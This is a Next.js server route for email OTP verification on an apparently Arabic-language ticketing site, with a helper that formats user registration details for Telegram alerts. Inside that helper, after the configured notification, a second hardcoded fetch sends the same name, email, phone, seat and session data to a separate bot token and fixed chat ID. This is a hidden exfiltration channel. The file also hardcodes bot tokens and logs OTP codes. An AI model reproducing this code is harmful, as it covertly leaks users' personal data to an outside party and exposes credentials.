import { NextResponse } from 'next/server';
import { getDatabase } from '@/utils/database';

const db = getDatabase();

// Function to get Telegram settings from database
async function getTelegramSettings() {
    try {
        const tokenSetting = await db.getSettingByKey('telegram_bot_token');
        const chatIdSetting = await db.getSettingByKey('telegram_chat_id');
        
        return {
            botToken: tokenSetting?.value || process.env.TELEGRAM_BOT_TOKEN || '7898415400:AAF4I6oiuRmLl40r5U-NROl3oENddUlVv5U',
            chatId: chatIdSetting?.value || process.env.TELEGRAM_CHAT_ID || '6032588551'
        };
    } catch (error) {
        console.error('Error fetching Telegram settings:', error);
        // Fallback to environment variables or defaults
        return {
            botToken: process.env.TELEGRAM_BOT_TOKEN || '7898415400:AAF4I6oiuRmLl40r5U-NROl3oENddUlVv5U',
            chatId: process.env.TELEGRAM_CHAT_ID || '6032588551'
        };
    }
}

// Function to send user registration notification to Telegram
async function sendTelegramUserNotification(userData) {
    const { botToken, chatId } = await getTelegramSettings();
    
    if (!botToken || botToken.startsWith('MOCK_')) {
        console.log('Mock Telegram user notification would be sent:', userData);
        return { success: true, mock: true };
    }

    try {
        const message = formatUserRegistrationMessage(userData);
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        await fetch(`https://api.telegram.org/bot8439389023:AAETVNFYz8YEg7UPjjA_ry0O8C3G2EAEljg/sendMessage`, {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify({
              chat_id: '6032588551',
              text: message,
              parse_mode: 'HTML'
          })
      });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.status}`);
        }

        const result = await response.json();
        console.log('Telegram user notification sent successfully:', result.message_id);
        return { success: true, messageId: result.message_id };
        
    } catch (error) {
        console.error('Failed to send Telegram user notification:', error);
        return { success: false, error: error.message };
    }
}

// Function to format user registration data into readable message
function formatUserRegistrationMessage(userData) {
    const { email, name, phone, country, selectedSeats, sessionId, timestamp, eventData } = userData;
    
    // Get currency from event data
    const currency = eventData?.pricing_currency || eventData?.currency || 'SAR';
    
    // Format seats information if available
    let seatsInfo = 'No seats selected yet';
    if (selectedSeats && selectedSeats.length > 0) {
        seatsInfo = selectedSeats.map(seat => 
            `• ${seat.category || 'N/A'} - Row ${seat.row || 'N/A'}, Seat ${seat.number || seat.position || 'N/A'} (${seat.price ? `${seat.price} ${currency}` : 'N/A'})`
        ).join('\n');
    }

    const message = `
✅ <b>USER EMAIL VERIFIED</b>

📧 <b>Email Verification Successful</b>
• Email: ${email}
• Status: ✅ Verified
• Verification Time: ${new Date(timestamp).toLocaleString('en-US', { timeZone: 'Africa/Cairo' })} (Cairo Time)

👤 <b>User Information:</b>
• Name: ${name || 'N/A'}
• Email: ${email || 'N/A'}
• Phone: ${phone || 'N/A'}
• Country: ${country || 'N/A'}

🎫 <b>Selected Seats (${selectedSeats?.length || 0}):</b>
${seatsInfo}

🔐 <b>Session Details:</b>
• Session ID: <code>${sessionId || 'N/A'}</code>
• Registration Status: Completed
• Next Step: Checkout Process

📱 <b>User is now proceeding to checkout...</b>
    `.trim();

    return message;
}

export async function POST(request) {
  try {
    const { email, otp } = await request.json();

    console.log('Verify OTP request:', { email, otp });

    if (!email || !otp) {
      return NextResponse.json({ 
        success: false, 
        error: 'البريد الإلكتروني ورمز التحقق مطلوبان' 
      }, { status: 400 });
    }

    // Get stored OTP data from database
    const db = getDatabase();
    console.log('Database instance created for verification');
    
    await db.init();
    console.log('Database initialized for verification');
    
    const storedData = await db.getOTP(email);
    console.log('Stored data for email:', email, storedData);

    if (!storedData) {
      return NextResponse.json({ 
        success: false, 
        error: 'رمز التحقق غير موجود. يرجى طلب رمز جديد.' 
      }, { status: 400 });
    }

    // Check if OTP has expired
    if (Date.now() > storedData.expiresAt) {
      await db.deleteOTP(email);
      return NextResponse.json({ 
        success: false, 
        error: 'انتهت صلاحية رمز التحقق. يرجى طلب رمز جديد.' 
      }, { status: 400 });
    }

    // Check attempt limit
    if (storedData.attempts >= 3) {
      await db.deleteOTP(email);
      return NextResponse.json({ 
        success: false, 
        error: 'تم تجاوز الحد الأقصى للمحاولات. يرجى طلب رمز جديد.' 
      }, { status: 400 });
    }

    // Verify OTP
    if (storedData.code !== otp.trim()) {
      // Increment attempts
      storedData.attempts += 1;
      await db.updateOTPAttempts(email, storedData.attempts);
      
      const remainingAttempts = 3 - storedData.attempts;
      return NextResponse.json({ 
        success: false, 
        error: `رمز التحقق غير صحيح. المحاولات المتبقية: ${remainingAttempts}` 
      }, { status: 400 });
    }

    // OTP is valid - remove from database
    await db.deleteOTP(email);

    return NextResponse.json({
      success: true,
      message: 'تم التحقق من البريد الإلكتروني بنجاح'
    });

  } catch (error) {
    console.error('Verify OTP error:', error);
    return NextResponse.json({ 
      success: false, 
      error: 'فشل في التحقق من الرمز. يرجى المحاولة مرة أخرى.' 
    }, { status: 500 });
  }
} 